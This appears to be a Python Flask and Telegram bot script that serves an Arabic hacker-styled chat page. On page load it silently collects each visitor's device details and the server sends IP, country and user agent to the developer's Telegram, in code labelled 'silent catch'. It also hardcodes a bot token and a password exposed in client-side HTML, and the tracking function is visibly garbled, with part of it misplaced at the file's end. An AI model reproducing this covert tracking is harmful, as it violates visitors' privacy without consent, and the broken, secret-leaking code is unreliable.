import telebot, os, requests
from flask import Flask, render_template_string, request, jsonify

# --- [ إعدادات المطور Muhammad ] ---
BOT_TOKEN = "6785445743:AAFquuyfY2IIjgs2x6PnL61uA-3apHIpz2k"
MY_ID = "6190753066"
ADMIN_PASS = "hx2026"
INSTA_URL = "https://instagram.com/kail.911"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

def get_ai_response(text):
    try:
        # محرك سريع جداً
        res = requests.get(f"https://api.simsimi.net/v2/?text={text}&lc=ar", timeout=3)
        return res.json().get('success', "النظام متصل وجاهز.")
    except:
        return "سيدي، أنا أسمعك وجاري الرد.."

HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MUHAMMAD SYSTEM</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body { margin:0; background:#000; color:#00ffcc; font-family:sans-serif; overflow:hidden; height:100vh; }
        .nav { position:fixed; top:0; width:100%; height:55px; background:rgba(0,0,0,0.9); display:flex; justify-content:space-between; align-items:center; padding:0 15px; border-bottom:1px solid #00ffcc33; z-index:1000; box-sizing:border-box; }
        .insta { border:1px solid #00ffcc; padding:4px 12px; border-radius:20px; color:#00ffcc; text-decoration:none; font-size:12px; }
        
        #dashboard { display:none; flex-direction:column; height:100vh; padding-top:55px; box-sizing:border-box; }
        
        /* تحسين عرض الموبايل */
        .map-box { height:25%; border:1px solid #00ffcc22; background:#050505; }
        .chat-box { flex:1; display:flex; flex-direction:column; background:#0a0a0a; position:relative; overflow:hidden; }
        
        .messages { flex:1; padding:15px; overflow-y:auto; display:flex; flex-direction:column; gap:10px; padding-bottom:70px; }
        .m { padding:12px 15px; border-radius:15px; font-size:15px; max-width:85%; line-height:1.4; word-wrap:break-word; }
        .u { background:#00ffcc; color:#00; align-self:flex-start; font-weight:bold; }
        .a { background:#1a1a1a; color:#fff; border:1px solid #00ffcc33; align-self:flex-end; }
        
        .input-area { position:absolute; bottom:0; width:100%; padding:10px; background:#050505; border-top:1px solid #1a1a1a; display:flex; gap:8px; box-sizing:border-box; }
        input { flex:1; background:#000; border:1px solid #00ffcc55; color:#00ffcc; padding:12px; border-radius:25px; outline:none; font-size:14px; }
        
        #login { height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; }
        .btn { background:#00ffcc; color:#00; border:none; padding:12px 50px; font-weight:bold; border-radius:30px; margin-top:20px; cursor:pointer; }
    </style>
</head>
<body onload="cap()">
    <div class="nav">
        <a href="{{ insta }}" target="_blank" class="insta">@kail.911</a>
        <div style="font-size:12px; font-weight:bold;">MUHAMMAD DEV</div>
    </div>

    <div id="login">
        <h2 style="letter-spacing:4px;">SYSTEM KEY</h2>
        <input type="password" id="p" placeholder="PASSWORD" style="width:220px; text-align:center; padding:12px; background:none; border:1px solid #00ffcc; color:#00ffcc;">
        <button onclick="auth()" class="btn">LOGIN</button>
    </div>

    <div id="dashboard">
        <div class="map-box">
            <iframe src="https://cybermap.kaspersky.com/en/widget/map" style="width:100%; height:100%; border:none; filter:hue-rotate(150deg);"></iframe>
        </div>
        <div class="chat-box">
            <div class="messages" id="msgs">
                <div class="m a">نظام المطور محمد نشط.. اسألني أي شيء وسأرد فوراً.</div>
            </div>
            <div class="input-area">
                <input type="text" id="ui" placeholder="اكتب رسالتك..." onkeypress="if(event.which==13)send()">
            </div>
        </div>
    </div>

    <script>
        function cap() {
        userAgent, res: screen.width+'x'+screen.height };
            fetch('/log', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(info) });
        }
        function auth() {
            if($("#p").val() === "{{ pass }}") { $("#login").hide(); $("#dashboard").css("display","flex"); }
            else { alert("KEY ERROR"); }
        }
        function send() {
            let t = $("#ui").val(); if(!t) return;
            $("#msgs").append(`<div class="m u">${t}</div>`); $("#ui").val("");
            $("#msgs").scrollTop($("#msgs")[0].scrollHeight);
            $.ajax({
                url:'/ai', method:'POST', contentType:'application/json', data:JSON.stringify({t:t}),
                success: function(d) {
                    $("#msgs").append(`<div class="m a">${d.r}</div>`);
                    $("#msgs").scrollTop($("#msgs")[0].scrollHeight);
                }
            });
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML, pass=ADMIN_PASS, insta=INSTA_URL)

@app.route("/log", methods=['POST'])
def log():
    try:
        g = requests.get('http://ip-api.com/json/').json()
        msg = f"🚀 **صيد صامت**\\n🌐 IP: `{g.get('query')}`\\n📍 الدولة: {g.get('country')}\\n📱 الجهاز: `{request.json.get('ua')[:40]}`"
        bot.send_message(MY_ID, msg)
    except: pass
    return jsonify(ok=True)

@app.route("/ai", methods=['POST'])
def ai():
    return jsonify(r=get_ai_response(request.json.get('t')))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
            const info = { ua: navigator.
